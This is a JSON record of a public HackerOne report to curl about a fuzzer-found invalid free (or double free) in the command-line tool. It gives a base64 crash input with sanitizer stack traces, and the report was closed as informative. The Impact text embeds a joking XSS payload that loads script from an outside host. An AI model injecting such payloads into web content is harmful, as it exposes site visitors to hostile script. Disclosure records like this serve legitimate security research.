@@ -1,0 +1,116 @@
+{
+  "id": 875775,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzU3NzU=",
+  "url": "https://hackerone.com/reports/875775",
+  "title": "Invalid write (or double free) triggers curl command line tool crash",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2020-05-15T23:21:01.674Z",
+  "submitted_at": "2020-05-15T23:21:01.674Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "geeknik",
+    "url": "/geeknik",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/jgjvp6dlesp661w5ashvoami0j3c/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-05-18T06:23:01.976Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-05-17T23:21:08.709Z",
+  "team_member_agreed_on_going_public_at": "2020-05-18T06:23:01.863Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nWhilst fuzzing libcurl built from `git commit a158a09`, a crash triggered by an invalid write (or maybe a double/invalid  free) was found. \n\n## Steps To Reproduce:\n\nRun:\n`echo \"LVQvCnVyIDA=\" | base64 -d > test0000`\n`./curl --verbose -q -K test0000 file:///dev/null`\n\nStack:\n\n```\nvalgrind -q src/curl --verbose -q -K ~/curl/tmp/out/crashes/test0001 file:///dev/null\n==12371== Invalid free() / delete / delete[] / realloc()\n==12371==    at 0x48369AB: free (vg_replace_malloc.c:530)\n==12371==    by 0x128C84: add_file_name_to_url (in /root/curl-no-asan/src/curl)\n==12371==    by 0x1259EF: create_transfer (in /root/curl-no-asan/src/curl)\n==12371==    by 0x1285DC: operate (in /root/curl-no-asan/src/curl)\n==12371==    by 0x119828: main (in /root/curl-no-asan/src/curl)\n==12371==  Address 0x192f1a is in a r-- mapped file /root/curl-no-asan/src/curl segment\n==12371==\n*   Trying 0.0.0.0:80...\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* connect to 0.0.0.0 port 80 failed: Connection refused\n* Failed to connect to 0 port 80: Connection refused\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n* Closing connection 0\ncurl: (7) Failed to connect to 0 port 80: Connection refused\n* Closing connection 1\n```\n\nIf we switch over to ASAN with AFL's libdislocator.so loaded:\n```\nLD_PRELOAD=/root/aflplusplus/libdislocator.so ../../../src/curl -q --verbose -K test0001 file:///dev/null\nAddressSanitizer:DEADLYSIGNAL\n=================================================================\n==12389==ERROR: AddressSanitizer: SEGV on unknown address 0x00000074b590 (pc 0x0000004267f4 bp 0x000000000000 sp 0x7fffffffcdd0 T0)\n==12389==The signal is caused by a WRITE memory access.\n    #0 0x4267f4 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) (/root/curl/src/curl+0x4267f4)\n    #1 0x49daa1 in free (/root/curl/src/curl+0x49daa1)\n    #2 0x511d0d in add_file_name_to_url /root/curl/src/tool_operhlp.c:117:7\n    #3 0x50281e in single_transfer /root/curl/src/tool_operate.c:1116:24\n    #4 0x4fe95b in transfer_per_config /root/curl/src/tool_operate.c:2438:14\n    #5 0x4fe95b in create_transfer /root/curl/src/tool_operate.c:2454:14\n    #6 0x4f9de6 in serial_transfers /root/curl/src/tool_operate.c:2273:12\n    #7 0x4f9de6 in run_all_transfers /root/curl/src/tool_operate.c:2479:16\n    #8 0x4f99d3 in operate /root/curl/src/tool_operate.c:2594:18\n    #9 0x4f8437 in main /root/curl/src/tool_main.c:323:14\n    #10 0x7ffff762309a in __libc_start_main /build/glibc-vjB4T1/glibc-2.28/csu/../csu/libc-start.c:308:16\n    #11 0x425559 in _start (/root/curl/src/curl+0x425559)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV (/root/curl/src/curl+0x4267f4) in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType)\n==12389==ABORTING\n*** [AFL] bad allocator canary on free() ***\nStack dump:\n0.      Program arguments: /usr/bin/llvm-symbolizer-10 --inlining=true --default-arch=x86_64\n/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm3sys15PrintStackTraceERNS_11raw_ostreamE+0x1f)[0x7ffff4227a9f]\n/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm3sys17RunSignalHandlersEv+0x50)[0x7ffff4225d60]\n/lib/x86_64-linux-gnu/libLLVM-10.so.1(+0xa50065)[0x7ffff4228065]\n/lib/x86_64-linux-gnu/libpthread.so.0(+0x12730)[0x7ffff37c9730]\n/lib/x86_64-linux-gnu/libc.so.6(gsignal+0x10b)[0x7ffff330a7bb]\n/lib/x86_64-linux-gnu/libc.so.6(abort+0x121)[0x7ffff32f5535]\n/root/aflplusplus/libdislocator.so(free+0x1e1)[0x7ffff7fc9bb1]\n/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm12PassRegistryD1Ev+0x1c)[0x7ffff435d1ec]\n/lib/x86_64-linux-gnu/libLLVM-10.so.1(+0xb85c0e)[0x7ffff435dc0e]\n/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm13llvm_shutdownEv+0xa9)[0x7ffff41bf329]\n/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm8InitLLVMD1Ev+0x10)[0x7ffff419f7a0]\n/usr/bin/llvm-symbolizer-10[0x406c70]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xeb)[0x7ffff32f709b]\n/usr/bin/llvm-symbolizer-10[0x405eda]\n```\n\n## Impact\n\nDenial of service, information disclosure, software crash, glitter everywhere\"><script src=//xss.mx></script>, the Kool-Aid<x=\" Man crashing through walls, dogs and cats living together, mass hysteria! Just kidding. It's probably limited only to the tool which means the impact is limited, I know the routine. (:",
+  "weakness": {
+    "id": 49,
+    "name": "Double Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 4,
+  "voters": [
+    "poneglyph",
+    "geeknik",
+    "brumbrum",
+    "suro"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
